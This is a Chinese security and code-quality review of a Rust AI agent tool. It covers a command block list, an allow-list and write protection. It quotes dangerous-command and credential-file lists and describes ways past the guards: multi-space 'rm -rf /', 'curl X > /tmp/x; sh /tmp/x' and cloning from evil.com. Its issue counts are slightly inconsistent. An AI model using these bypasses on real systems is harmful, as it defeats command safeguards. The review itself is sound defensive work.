# RHermes 代码审查报告 v4 — 最新版 (v0.4.4)

> 审查日期：2026-06-09 | 范围：全部 54 个 Rust 源文件 | 最新版本：v0.4.4

---

## 一、版本演进摘要

| 版本 | 关键变更 |
|------|----------|
| v0.4.0 | **安全加固**：命令黑名单 + 配置写保护 + 工作目录边界 + 工具限制 + untrusted 标记 |
| v0.4.1 | 搜索引擎抽象层 + MCP 协议特性增强 |
| v0.4.2 | 搜索配置 + WebFetch 增强 + 多引擎防御性改进 |
| v0.4.3 | Telegram 通道 + 配置模板生成 (config init/check/save) |
| v0.4.4 | 工具调用参数完整显示 + 搜索引擎名称标注 |

共 29 个文件变更，+2271 / -170 行。

---

## 二、v0.4.0 安全加固详细分析

### ✅ 亮点：三层安全防线已就位

#### 防线 1 — 命令黑名单 (`tools/builtin.rs:29-51`)
```rust
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf", "del /s /q c:", "format ", "shutdown", ...
];
```
`run_command.execute()` 执行前先做大小写不敏感匹配，命中直接拒绝。

**优点**：覆盖了最常见的危险命令（文件删除、磁盘格式化、系统关机、权限修改等）。

**剩余风险**：
- 🟡 仅做**子串匹配**，`rm  -rf`（双空格）或 `rm        -rf`（多空格+tab）可以绕过
- 🟡 管道命令拆分不完整：`curl X | sh` 被拦截，但 `curl X > /tmp/x; sh /tmp/x` 不拦
- 🟡 Linux 专属命令在 Windows 上也匹配，虽然不会执行但会产生无意义的拦截
- 🟢 `"net user"` 过于宽泛：`net user` 在 Windows 上既可能是 `net user administrator`（危险），也可能是 `net user %username%`（无害）

#### 防线 2 — 命令白名单 (`tools/builtin.rs:539-557`)
```rust
if !cfg.agent.command_allowed_prefixes.is_empty() {
    let first_word = command.split_whitespace().next().unwrap_or("");
    if !allowed { ... }
}
```
支持 config.toml 中配置允许的命令前缀（如 `git`, `ls`, `cat`）。`command_require_confirm` 控制严格模式 vs 警告模式。

**剩余风险**：
- 🟡 **默认不启用**：白名单为空时完全不检查，同时`command_allowed_prefixes`也是空的
- 🟡 只匹配 `first_word`：`/usr/bin/git` 不会匹配 `git`
- 🟡 无路径白名单：`git clone https://evil.com/repo` 没有路径限制

#### 防线 3 — 写保护 + 工作边界 (`tools/builtin.rs:60-81`)
```rust
// 受保护文件
const PROTECTED_FILES: &[&str] = &[
    "config.toml", ".env", ".ssh/id_rsa", "/etc/passwd", ...
];
// 工作目录边界
GLOBAL_WORKSPACE: OnceLock<String> = OnceLock::new();
```

**剩余风险**：
- 🟡 `is_protected_path` 用 `.ends_with()` 检查：路径 `foo/../config.toml` 标准化后匹配，但 `config.toml.bak` 也会误匹配
- 🟡 `GLOBAL_WORKSPACE` 是 `OnceLock`：若 main.rs 未调用 `set_workspace()`，边界检查**完全跳过**，默认放行
- 🟡 边界检查中 `normalized.starts_with(&ws_norm)` 对 Windows 路径不健全：`C:\workspace` 与 `C:\workspace2` 会被 `starts_with` 误判

---

## 三、v0.4.0 前后对比：修复率统计

| v0.3.0 已发现问题 | v0.4.4 状态 | 详情 |
|-------------------|-------------|------|
| `run_command` 零限制 | ✅ **已修复** | 三层安全防线（黑名单+白名单+代理） |
| `write_file` 路径注入 | ✅ **已修复** | 写保护 + 工作目录边界 |
| `glob` 依赖 `fd` 命令 | ✅ **已修复** | 改用 `walkdir` crate + 正则匹配 |
| `read_file` `range` 参数 | 🔴 **仍未修复** | 声明了但 execute() 中完全未读取 |
| `cost.rs` 未集成 | 🔴 **仍未修复** | main.rs 有 `mod cost` 但无实际使用 |
| `MemoryManager` 未使用 | 🔴 **仍未修复** | AgentSession 仍直接调 MemorySystem |
| SSE 工具调用跨 chunk 合并 | 🔴 **仍未修复** | provider/transport.rs 每个 chunk 独立发送 |
| `get_current_time` UTC+8 硬编码 | 🔴 **仍未修复** | 仍是 `chrono::Local::now().format("(UTC+8)")` |
| `read_pdf` 参数提取不一致 | 🔴 **仍未修复** | 仍手动 `args["path"].as_str()` |
| `write_file` 非原子写入 | 🔴 **仍未修复** | 仍直接用 `tokio::fs::write` |
| 双 `ApiMessage` 定义 | 🔴 **仍未修复** | api/mod.rs 和 core/context.rs 各一份 |
| `web_fetch` SSRF | 🔴 **仍未修复** | 无内网地址检测 |
| Debug 系统无消费 | 🔴 **仍未修复** | 仅导出 JSON |
| 会话持久化 | 🔴 **仍未修复** | `--resume` 不工作 |
| 新模块零测试 | 🔴 **仍未修复** | mcp/provider/channel 无单元测试 |

**旧问题修复率：3/15 → 仅 20%（仅安全相关项被修复）**

---

## 四、v0.4.0-v0.4.4 新增的问题

### 新增安全类

#### 1. `is_protected_path` 的 `.ends_with()` + `.contains()` 存在误报和漏报 🟡

```rust
fn is_protected_path(path: &str) -> bool {
    PROTECTED_FILES.iter().any(|p| {
        normalized.ends_with(&p.to_lowercase()) || normalized.contains(&p.to_lowercase())
    })
}
```

- **误报**：路径 `a/b/config.toml.bak` → `ends_with("config.toml")` 为 false 但 `contains("config.toml")` 为 true
- **漏报**：路径 `foo/../../../etc/passwd` 的 `normalized` 是 `foo/../../../etc/passwd`，`ends_with("/etc/passwd")` 为 true（这点 OK）
- **PATH 不一致**：Windows 路径 `D:\etc\passwd` → `d:/etc/passwd` → `ends_with("/etc/passwd")` 正确。但用路径解析库（如 `canonicalize`）会更可靠

#### 2. `rw -rf` 等多空格变体绕过黑名单 🟡

```rust
let lower = cmd.to_lowercase();
for pattern in DANGEROUS_PATTERNS {
    if lower.contains(&pattern.to_lowercase()) { ... }
}
```

`rm   -rf /`（三个空格）不被匹配因为原模式是 `"rm -rf"`（一个空格）。建议先做空格归一化。

#### 3. 白名单检查中 `first_word` 路径敏感 🟡

`/usr/bin/git status` 的 `first_word` 是 `/usr/bin/git`，如果白名单配的是 `git`，则匹配失败。应同时检查 `Path::new(first_word).file_stem()`。

#### 4. `GLOBAL_WORKSPACE` 未初始化时边界检查静默跳过 🟡

```rust
if let Some(ws) = GLOBAL_WORKSPACE.get() { ... }
```

如果 `set_workspace()` 从未被调用，所有 `write_file` 都不会被限制 — 包括写 `/etc/hosts` 或 `~/.bashrc`。

### 新增架构类

#### 5. `tools_from_registry()` 与 `default_tools()` 代码重复 🟡

`api/mod.rs` 中新增了 `tools_from_registry()` 动态生成工具定义（包含 MCP 工具），但 `default_tools()` 仍然保留并作为 fallback。两份代码独立维护，工具描述、参数定义可能不一致。

#### 6. Telegram 新增但 Gateway PID 检测仍仅限 Windows 🟡

`gateway/mod.rs` 中 `is_pid_running()` 仍用 `tasklist /FI "PID eq X"`（仅 Windows）。Telegram Channel 跨平台工作，但 Gateway 的 PID 检测只在 Windows 有效。

#### 7. Config 模板生成函数过于庞大 🟢

`config.rs` 新增 +559 行，`save_config_template()` 和 `check_config()` 超过 200 行的硬编码字符串拼接。新增配置项容易遗漏更新模板函数。

### 新增代码质量类

#### 8. `glob_match` 仍每文件编译一次正则 🟡

```rust
fn glob_match(pattern: &str, name: &str) -> bool {
    let re = regex::Regex::new(&format!("^{}$", re_str)).ok();
    re.map_or(true, |r| r.is_match(name))
}
```

`search_content` 遍历大项目时，每个文件路径调用 `glob_match` 一次，每次都 `Regex::new()` 编译。正则应在循环外预编译。

#### 9. `glob_to_regex_str` 和 `glob_match` 仍独立存在 🟢

虽然 `glob` 工具统一用了 `glob_to_regex_str`，但 `search_content` 仍然用独立的 `glob_match` 函数，两者的转义逻辑略有差异（`glob_to_regex_str` 转义 `|`，`glob_match` 不转义）。

#### 10. Telegram Channel 的 `poll_timeout` 类型为 `u32` 🟢

直接从配置的 `poll_timeout_secs`（u64）shadow copy 到 `u32`，如果配置值大于 `u32::MAX`（约 136 年）溢出。实际影响为零但类型不安全。

---

## 五、完整问题清单（v0.4.4）

### 🔴 严重 — 应立即修复

| # | 问题 | 位置 | 状态 |
|---|------|------|------|
| 1 | `read_file` 声明 `range` 参数但 execute() 不读取 | `tools/builtin.rs:105-123` | 旧问题 |
| 2 | SSE 工具调用跨 chunk 参数不合并 | `provider/transport.rs:173-191` | 旧问题 |
| 3 | `cost.rs` 560 行未集成（NEEDS_PRO 升级、Flash-First 分级） | `cost.rs` | 旧问题 |
| 4 | `GLOBAL_WORKSPACE` 未初始化时边界检查完全跳过 | `tools/builtin.rs:462-478` | **新问题** |

### 🟡 中等 — 建议修复

| # | 问题 | 位置 |
|---|------|------|
| 5 | `is_dangerous_command` 多空格可绕过 | `tools/builtin.rs:43-51` |
| 6 | `is_protected_path` `contains()` 产生误报 | `tools/builtin.rs:69-73` |
| 7 | 白名单 `first_word` 对绝对路径不匹配 | `tools/builtin.rs:541` |
| 8 | `MemoryManager` 编排层仍未使用 | `agent/memory_manager.rs` |
| 9 | `web_fetch` SSRF 未防护 | `tools/builtin.rs` |
| 10 | `write_file` 非原子写入 | `tools/builtin.rs:487` |
| 11 | `glob_match` 每文件编译正则 | `tools/builtin.rs:290-301` |
| 12 | `tools_from_registry` 与 `default_tools` 重复 | `api/mod.rs` |
| 13 | Gateway PID 检测仅 Windows（Telegram 跨平台需求） | `gateway/mod.rs` |
| 14 | Debug 系统无消费回路 | `debug.rs` |

### 🟢 轻微 — 优化建议

| # | 问题 | 位置 |
|---|------|------|
| 15 | `get_current_time` 硬编码 UTC+8 | `tools/builtin.rs:647` |
| 16 | `read_pdf` 手动提取 path vs get_string_arg | `tools/builtin.rs:327` |
| 17 | 双 `ApiMessage` 定义 | `api/mod.rs` + `core/context.rs` |
| 18 | 两个 glob→regex 实现 | `tools/builtin.rs` |
| 19 | SessionRouter 无过期清理 | `agent/router.rs` |
| 20 | 新模块无单元测试 | mcp/provider/channel/gateway |
| 21 | Config 模板函数过大（200+ 行字符串拼接） | `core/config.rs` |
| 22 | Telegram `poll_timeout` u32→u64 截断风险 | `channel/telegram/mod.rs` |
| 23 | `tools_from_registry` 每次调用遍历全部工具 | `api/mod.rs:292` |

---

## 六、v0.4.0-v0.4.4 值得表扬的改进

| 改进 | 说明 |
|------|------|
| 命令安全三层防线 | 黑名单拦截 + 白名单控制 + 代理注入 — 设计合理 |
| `glob` 去 `fd` 依赖 | 改用 `walkdir` crate — 无外部依赖、跨平台 |
| `tools_from_registry()` | 动态工具定义，MCP 远程工具自动包含 |
| Telegram Channel | 完整 Bot 实现，Long Polling + 分片 |
| Config 管理子命令 | `config init/check/save` 提升可运维性 |
| 搜索引擎结果标注 | 显示来源引擎名称（DDG/Serper/Bing） |
| `GLOBAL_WORKSPACE` | 工作目录边界检查 — 好设计但需补齐初始化保证 |

---

*审查完毕 — 22 个待修复问题（4 严重 + 10 中等 + 8 轻微）*
